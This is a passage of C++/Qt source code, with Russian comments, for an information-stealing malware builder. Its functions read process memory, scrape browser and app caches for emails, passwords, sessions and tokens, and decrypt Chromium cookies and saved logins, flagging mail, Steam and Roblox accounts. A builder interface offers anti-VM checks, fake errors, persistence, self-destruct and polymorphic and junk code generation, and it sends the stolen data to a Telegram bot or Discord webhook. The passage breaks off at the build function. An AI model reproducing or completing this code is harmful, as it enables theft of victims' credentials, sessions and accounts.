                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log(QString::fromStdString("Cache path not found for " + browserName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open cache file for " + browserName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + browserName + "] Unsaved Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex passRegex("pass(?:word)?=[^&\\s]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, passRegex)) {
                    result += "[" + browserName + "] Unsaved Password: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex autofillRegex("\"autofill\":\"[^\"]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, autofillRegex)) {
                    result += "[" + browserName + "] Autofill Data: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + browserName + "] Unsaved Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what()));
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log(QString::fromStdString("Cache path not found for " + appName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open cache file for " + appName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    result += "[" + appName + "] Cached Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + appName + "] Cached Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + appName + "] Cached Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealAppCacheData for " + appName + ": " + e.what()));
    }

    return result;
}

// Кража данных Chromium
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath, const std::string& dir) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    std::string cookiesDbPath = dbPath + "Cookies";
    std::string loginDbPath = dbPath + "Login Data";
    sqlite3* db = nullptr;

    // Кража cookies
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                            host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                            host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                            host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                            host.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                        } else {
                            result += "[" + browserName + "] Cookie | " + host + " | " + name + " | " + value + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log(QString::fromStdString("Failed to prepare SQLite statement for cookies in " + browserName));
            }
            sqlite3_close(db);
        } else {
            Log(QString::fromStdString("Failed to open Cookies database for " + browserName));
        }
    }

    // Кража паролей
    db = nullptr;
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
                            url.find("yahoo.com") != std::string::npos || url.find("mail.ru") != std::string::npos ||
                            url.find("aol.com") != std::string::npos || url.find("protonmail.com") != std::string::npos ||
                            url.find("icloud.com") != std::string::npos || url.find("steampowered.com") != std::string::npos ||
                            url.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Password (" + url + ") | " + username + " | " + password + "\n";
                        } else {
                            result += "[" + browserName + "] Password | " + url + " | " + username + " | " + password + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log(QString::fromStdString("Failed to prepare SQLite statement for passwords in " + browserName));
            }
            sqlite3_close(db);
        } else {
            Log(QString::fromStdString("Failed to open Login Data database for " + browserName));
        }
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\" + browserName + "_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved " + browserName + " data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save " + browserName + " data to: " + outputFile));
        }
    }

    return result;
}

// Реализация методов MainWindow

MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow) {
    ui->setupUi(this);

    // Инициализация UI элементов
    tokenLineEdit = new QLineEdit(this);
    chatIdLineEdit = new QLineEdit(this);
    discordWebhookLineEdit = new QLineEdit(this);
    fileNameLineEdit = new QLineEdit(this);
    encryptionKey1LineEdit = new QLineEdit(this);
    encryptionKey2LineEdit = new QLineEdit(this);
    encryptionSaltLineEdit = new QLineEdit(this);
    iconPathLineEdit = new QLineEdit(this);
    githubTokenLineEdit = new QLineEdit(this);
    githubRepoLineEdit = new QLineEdit(this);
    sendMethodComboBox = new QComboBox(this);
    buildMethodComboBox = new QComboBox(this);
    steamCheckBox = new QCheckBox("Steam", this);
    steamMAFileCheckBox = new QCheckBox("Steam MA Files", this);
    epicCheckBox = new QCheckBox("Epic Games", this);
    robloxCheckBox = new QCheckBox("Roblox", this);
    battlenetCheckBox = new QCheckBox("Battle.net", this);
    minecraftCheckBox = new QCheckBox("Minecraft", this);
    discordCheckBox = new QCheckBox("Discord", this);
    telegramCheckBox = new QCheckBox("Telegram", this);
    chatHistoryCheckBox = new QCheckBox("Chat History", this);
    cookiesCheckBox = new QCheckBox("Cookies", this);
    passwordsCheckBox = new QCheckBox("Passwords", this);
    screenshotCheckBox = new QCheckBox("Screenshot", this);
    fileGrabberCheckBox = new QCheckBox("File Grabber", this);
    systemInfoCheckBox = new QCheckBox("System Info", this);
    socialEngineeringCheckBox = new QCheckBox("Social Engineering", this);
    antiVMCheckBox = new QCheckBox("Anti-VM", this);
    fakeErrorCheckBox = new QCheckBox("Fake Error", this);
    silentCheckBox = new QCheckBox("Silent Mode", this);
    autoStartCheckBox = new QCheckBox("Auto Start", this);
    persistCheckBox = new QCheckBox("Persist", this);
    selfDestructCheckBox = new QCheckBox("Self Destruct", this);
    textEdit = new QTextEdit(this);
    iconBrowseButton = new QPushButton("Browse Icon", this);
    buildButton = new QPushButton("Build", this);
    actionSaveConfig = new QAction("Save Config", this);
    actionLoadConfig = new QAction("Load Config", this);
    actionExportLogs = new QAction("Export Logs", this);
    actionExit = new QAction("Exit", this);
    actionAbout = new QAction("About", this);

    // Инициализация других членов
    manager = new QNetworkAccessManager(this);
    isBuilding = false;
    buildTimer = new QTimer(this);
    statusCheckTimer = new QTimer(this);

    // Настройка UI
    QVBoxLayout* layout = new QVBoxLayout;
    layout->addWidget(new QLabel("Telegram Token:"));
    layout->addWidget(tokenLineEdit);
    layout->addWidget(new QLabel("Chat ID:"));
    layout->addWidget(chatIdLineEdit);
    layout->addWidget(new QLabel("Discord Webhook:"));
    layout->addWidget(discordWebhookLineEdit);
    layout->addWidget(new QLabel("File Name:"));
    layout->addWidget(fileNameLineEdit);
    layout->addWidget(new QLabel("Encryption Key 1:"));
    layout->addWidget(encryptionKey1LineEdit);
    layout->addWidget(new QLabel("Encryption Key 2:"));
    layout->addWidget(encryptionKey2LineEdit);
    layout->addWidget(new QLabel("Encryption Salt:"));
    layout->addWidget(encryptionSaltLineEdit);
    layout->addWidget(new QLabel("Icon Path:"));
    layout->addWidget(iconPathLineEdit);
    layout->addWidget(iconBrowseButton);
    layout->addWidget(new QLabel("GitHub Token:"));
    layout->addWidget(githubTokenLineEdit);
    layout->addWidget(new QLabel("GitHub Repo:"));
    layout->addWidget(githubRepoLineEdit);
    layout->addWidget(new QLabel("Send Method:"));
    layout->addWidget(sendMethodComboBox);
    layout->addWidget(new QLabel("Build Method:"));
    layout->addWidget(buildMethodComboBox);
    layout->addWidget(steamCheckBox);
    layout->addWidget(steamMAFileCheckBox);
    layout->addWidget(epicCheckBox);
    layout->addWidget(robloxCheckBox);
    layout->addWidget(battlenetCheckBox);
    layout->addWidget(minecraftCheckBox);
    layout->addWidget(discordCheckBox);
    layout->addWidget(telegramCheckBox);
    layout->addWidget(chatHistoryCheckBox);
    layout->addWidget(cookiesCheckBox);
    layout->addWidget(passwordsCheckBox);
    layout->addWidget(screenshotCheckBox);
    layout->addWidget(fileGrabberCheckBox);
    layout->addWidget(systemInfoCheckBox);
    layout->addWidget(socialEngineeringCheckBox);
    layout->addWidget(antiVMCheckBox);
    layout->addWidget(fakeErrorCheckBox);
    layout->addWidget(silentCheckBox);
    layout->addWidget(autoStartCheckBox);
    layout->addWidget(persistCheckBox);
    layout->addWidget(selfDestructCheckBox);
    layout->addWidget(textEdit);
    layout->addWidget(buildButton);

    QWidget* centralWidget = new QWidget(this);
    centralWidget->setLayout(layout);
    setCentralWidget(centralWidget);

    // Настройка выпадающих списков
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});

    // Подключение сигналов и слотов
    connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    // Инициализация глобальной переменной
    g_mainWindow = this;

    // Загрузка конфигурации
    loadConfig();
}

MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
}

void MainWindow::emitLog(const QString& message) {
    emit logUpdated(message);
}

void MainWindow::appendLog(const QString& message) {
    textEdit->append(message);
}

std::string MainWindow::generateRandomString(size_t length) {
    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, characters.size() - 1);

    std::string randomString;
    for (size_t i = 0; i < length; ++i) {
        randomString += characters[distribution(generator)];
    }
    return randomString;
}

std::string MainWindow::generateUniqueXorKey() {
    return generateRandomString(16);
}

std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string key = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    return GetStaticEncryptionKey(key);
}

std::array<unsigned char, 16> MainWindow::generateIV() {
    return GenerateIV();
}

bool MainWindow::isRunningInVM() {
    return CheckVirtualEnvironment();
}

void MainWindow::updateConfigFromUI() {
    config.telegramBotToken = tokenLineEdit->text().toStdString();
    config.telegramChatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.githubToken = githubTokenLineEdit->text().toStdString();
    config.githubRepo = githubRepoLineEdit->text().toStdString();
    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.discord = discordCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.stealFiles = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.selfDestruct = selfDestructCheckBox->isChecked();
    config.sendToTelegram = (config.sendMethod == "Telegram");
    config.sendToDiscord = (config.sendMethod == "Discord");
    config.sendToServer = (config.sendMethod == "Local File");
}

void MainWindow::saveConfig() {
    QSettings settings("MyApp", "Config");
    settings.setValue("telegramBotToken", QString::fromStdString(config.telegramBotToken));
    settings.setValue("telegramChatId", QString::fromStdString(config.telegramChatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("discord", config.discord);
    settings.setValue("telegram", config.telegram);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("selfDestruct", config.selfDestruct);
    Log(QString("Configuration saved"));
}

void MainWindow::loadConfig() {
    QSettings settings("MyApp", "Config");
    config.telegramBotToken = settings.value("telegramBotToken", "").toString().toStdString();
    config.telegramChatId = settings.value("telegramChatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "output.exe").toString().toStdString();
    config.encryptionKey1 = settings.value("encryptionKey1", generateRandomString(16)).toString().toStdString();
    config.encryptionKey2 = settings.value("encryptionKey2", generateRandomString(16)).toString().toStdString();
    config.encryptionSalt = settings.value("encryptionSalt", generateRandomString(16)).toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.discord = settings.value("discord", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();

    // Обновление UI
    tokenLineEdit->setText(QString::fromStdString(config.telegramBotToken));
    chatIdLineEdit->setText(QString::fromStdString(config.telegramChatId));
    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    fileNameLineEdit->setText(QString::fromStdString(config.filename));
    encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
    encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
    encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
    iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
    sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    steamCheckBox->setChecked(config.steam);
    steamMAFileCheckBox->setChecked(config.steamMAFile);
    epicCheckBox->setChecked(config.epic);
    robloxCheckBox->setChecked(config.roblox);
    battlenetCheckBox->setChecked(config.battlenet);
    minecraftCheckBox->setChecked(config.minecraft);
    discordCheckBox->setChecked(config.discord);
    telegramCheckBox->setChecked(config.telegram);
    chatHistoryCheckBox->setChecked(config.chatHistory);
    cookiesCheckBox->setChecked(config.cookies);
    passwordsCheckBox->setChecked(config.passwords);
    screenshotCheckBox->setChecked(config.screenshot);
    fileGrabberCheckBox->setChecked(config.fileGrabber);
    systemInfoCheckBox->setChecked(config.systemInfo);
    socialEngineeringCheckBox->setChecked(config.socialEngineering);
    antiVMCheckBox->setChecked(config.antiVM);
    fakeErrorCheckBox->setChecked(config.fakeError);
    silentCheckBox->setChecked(config.silent);
    autoStartCheckBox->setChecked(config.autoStart);
    persistCheckBox->setChecked(config.persist);
    selfDestructCheckBox->setChecked(config.selfDestruct);

    Log(QString("Configuration loaded"));
}

void MainWindow::exportLogs() {
    QString fileName = QFileDialog::getSaveFileName(this, "Export Logs", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        Log(QString("Logs exported to: ") + fileName);
    } else {
        Log(QString("Failed to export logs to: ") + fileName);
    }
}

void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Select Icon", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        iconPathLineEdit->setText(fileName);
        config.iconPath = fileName.toStdString();
        Log(QString("Icon selected: ") + fileName);
    }
}

void MainWindow::on_buildButton_clicked() {
    updateConfigFromUI();
    if (config.buildMethod == "Local Build") {
        buildExecutable();
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    }
}

void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    if (encryptedData.isEmpty() && files.empty()) {
        Log(QString("No data to send"));
        return;
    }

    if (config.sendToServer) {
        sendDataToServer(encryptedData.toStdString(), files);
    }
    if (config.sendToTelegram) {
        sendToTelegram(encryptedData.toStdString(), files);
    }
    if (config.sendToDiscord) {
        sendToDiscord(encryptedData.toStdString(), files);
    }
}

void MainWindow::sendDataToServer(const std::string& encryptedData, const std::vector<std::string>& files) {
    std::string outputDir = "output";
    std::filesystem::create_directory(outputDir);

    std::string dataFile = outputDir + "\\data_" + std::to_string(GetTickCount()) + ".txt";
    std::ofstream outFile(dataFile);
    if (outFile.is_open()) {
        outFile << encryptedData;
        outFile.close();
        Log(QString::fromStdString("Data saved to: " + dataFile));
    } else {
        Log(QString::fromStdString("Failed to save data to: " + dataFile));
    }

    for (const auto& file : files) {
        std::string destPath = outputDir + "\\" + std::filesystem::path(file).filename().string();
        try {
            std::filesystem::copy_file(file, destPath, std::filesystem::copy_options::overwrite_existing);
            Log(QString::fromStdString("File copied to: " + destPath));
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Failed to copy file " + file + ": " + e.what()));
        }
    }
}

void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        Log(QString("Telegram bot token or chat ID not specified"));
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    // Добавление текстовых данных
    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    // Добавление файлов
    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log(QString::fromStdString("Failed to open file for Telegram: " + filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString("https://api.telegram.org/bot%1/sendDocument?chat_id=%2")
                                 .arg(QString::fromStdString(config.telegramBotToken))
                                 .arg(QString::fromStdString(config.telegramChatId))));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.discordWebhook.empty()) {
        Log(QString("Discord webhook not specified"));
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    // Добавление текстовых данных
    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    // Добавление файлов
    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log(QString::fromStdString("Failed to open file for Discord: " + filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        Log(QString("Data sent successfully"));
    } else {
        Log(QString("Failed to send data: ") + reply->errorString());
    }
    reply->deleteLater();
}

void MainWindow::generatePolymorphicCode() {
    std::string polyCode = GeneratePolymorphicCode();
    std::ofstream outFile("polymorphic_code.h");
    if (outFile.is_open()) {
        outFile << polyCode;
        outFile.close();
        Log(QString("Polymorphic code generated"));
    } else {
        Log(QString("Failed to generate polymorphic code"));
    }
}

void MainWindow::generateBuildKeyHeader() {
    std::ofstream outFile("build_key.h");
    if (outFile.is_open()) {
        outFile << "#ifndef BUILD_KEY_H\n";
        outFile << "#define BUILD_KEY_H\n\n";
        outFile << "#include <array>\n";
        outFile << "#include <string>\n\n";
        outFile << "std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key);\n";
        outFile << "std::array<unsigned char, 16> GenerateIV();\n\n";
        outFile << "#endif // BUILD_KEY_H\n";
        outFile.close();
        Log(QString("Build key header generated"));
    } else {
        Log(QString("Failed to generate build key header"));
    }
}

// Добавление генерации мусорного кода с использованием junk_code.h
void MainWindow::generateJunkCode() {
    std::string junkCode = GenerateJunkCode();
    std::ofstream outFile("junk_code_generated.h");
    if (outFile.is_open()) {
        outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
        outFile << "#define JUNK_CODE_GENERATED_H\n\n";
        outFile << junkCode;
        outFile << "\n#endif // JUNK_CODE_GENERATED_H\n";
        outFile.close();
        Log(QString("Junk code generated and saved to junk_code_generated.h"));
    } else {
        Log(QString("Failed to generate junk code"));
    }
}

void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        Log(QString("No icon path specified"));
        return;
    }

    std::string destPath = "build\\" + std::filesystem::path(config.iconPath).filename().string();
    try {
        std::filesystem::copy_file(config.iconPath, destPath, std::filesystem::copy_options::overwrite_existing);
        Log(QString::fromStdString("Icon copied to: " + destPath));
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Failed to copy icon: " + std::string(e.what())));
    }
}

void MainWindow::buildExecutable() {
